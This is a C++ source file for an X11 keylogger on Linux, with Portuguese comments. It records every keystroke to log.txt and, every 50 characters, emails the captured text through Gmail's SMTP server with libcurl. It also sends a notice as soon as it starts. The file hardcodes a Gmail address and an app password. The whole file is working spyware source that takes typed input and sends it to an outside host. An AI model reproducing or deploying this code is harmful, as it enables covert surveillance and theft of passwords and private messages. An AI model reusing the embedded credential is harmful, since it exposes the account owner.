#include <iostream>
#include <fstream>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <unistd.h>
#include <unordered_set>
#include <curl/curl.h>
#include <sstream>
#include <cstring> // Para memcpy

using namespace std;

// Função para gravar as teclas no arquivo log.txt
void SaveKeystrokes(const string& key) {
    ofstream logfile("log.txt", ios::app);
    if (!logfile.is_open()) {
        cerr << "Erro ao abrir log.txt para gravação." << endl;
        return;
    }
    logfile << key;
    logfile.close();
}

// Função de callback para leitura do corpo do e-mail
size_t ReadCallback(void *ptr, size_t size, size_t nmemb, void *stream) {
    stringstream* body = static_cast<stringstream*>(stream);
    string data;
    getline(*body, data);
    size_t length = data.size();
    memcpy(ptr, data.c_str(), length);
    return length;
}

// Função de callback para resposta do servidor
size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    (void)contents;
    (void)userp;
    return size * nmemb;
}

// Envia o conteúdo do arquivo de log por e-mail
void SendLogByEmail(const string& logContent) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *recipients = NULL;
    stringstream emailBody;

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587"); // Usando o servidor SMTP do Gmail
        curl_easy_setopt(curl, CURLOPT_USERNAME, "ronaldespertosoares@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "alos ogwr pqmu ntze"); // Senha de aplicativo

        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "<ronaldespertosoares@gmail.com>");
        recipients = curl_slist_append(recipients, "ronaldespertosoares@gmail.com"); // Enviando para o próprio e-mail
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        emailBody << "To: ronaldespertosoares@gmail.com\r\n"
                  << "From: ronaldespertosoares@gmail.com\r\n"
                  << "Subject: Keylogger Log\r\n"
                  << "\r\n"
                  << logContent;

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, ReadCallback);
        curl_easy_setopt(curl, CURLOPT_READDATA, &emailBody);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        // Adiciona um callback para lidar com a resposta do servidor
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        }

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    } else {
        cerr << "Erro ao inicializar o libcurl." << endl;
    }
}

// Converte o código da tecla pressionada em string para salvar no arquivo
string KeyCodeToString(KeySym key) {
    if (key == XK_space)
        return " ";
    if (key >= XK_0 && key <= XK_9)
        return string(1, (char)key);
    if (key >= XK_A && key <= XK_Z)
        return string(1, (char)key);
    if (key >= XK_a && key <= XK_z)
        return string(1, (char)key);
    
    // Outros mapeamentos
    switch (key) {
        case XK_Return:
            return "[ENTER]";
        case XK_Shift_L:
        case XK_Shift_R:
            return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R:
            return "[CTRL]";
        case XK_BackSpace:
            return "[BACKSPACE]";
        case XK_Tab:
            return "[TAB]";
        case XK_Escape:
            return "[ESC]";
        default:
            return "";  // Se a tecla não for relevante, retorna vazio
    }
}

int main() {
    Display *display;
    char keys_return[32];
    unordered_set<KeyCode> keys_pressed;
    stringstream logStream;
    const size_t MAX_LOG_LENGTH = 50; // Máximo de caracteres antes de enviar o e-mail

    // Abre a conexão com o servidor X (X11)
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        cerr << "Erro: Não foi possível abrir a exibição X11." << endl;
        return -1;
    }

    // Envia um e-mail com o conteúdo do log assim que o programa for iniciado
    SendLogByEmail("Início do Keylogger\n");

    // Loop infinito para capturar as teclas pressionadas
    while (true) {
        // Pega o estado atual do teclado
        XQueryKeymap(display, keys_return);

        for (int i = 0; i < 32; i++) {
            for (int bit = 0; bit < 8; bit++) {
                // Verifica se a tecla foi pressionada
                if (keys_return[i] & (1 << bit)) {
                    KeyCode keycode = i * 8 + bit;

                    // Verifica se a tecla já foi registrada como pressionada
                    if (keys_pressed.find(keycode) == keys_pressed.end()) {
                        KeySym key = XkbKeycodeToKeysym(display, keycode, 0, 0);
                        string keyString = KeyCodeToString(key);

                        // Se a tecla foi mapeada corretamente, grava no log
                        if (!keyString.empty()) {
                            SaveKeystrokes(keyString);
                            logStream << keyString;
                            keys_pressed.insert(keycode);  // Adiciona a tecla ao conjunto de teclas pressionadas
                        }
                    }
                } else {
                    // Se a tecla não estiver pressionada, remove do conjunto
                    keys_pressed.erase(i * 8 + bit);
                }
            }
        }

        // Envia o conteúdo do log por e-mail se o comprimento máximo for atingido
        if (logStream.tellp() >= MAX_LOG_LENGTH) {
            SendLogByEmail(logStream.str());
            logStream.str(""); // Limpa o stream
            logStream.clear(); // Limpa o estado de erro
        }

        usleep(10000); // Pequena pausa para evitar uso excessivo de CPU
    }

    // Fecha a conexão com o X11
    XCloseDisplay(display);
    return 0;
}
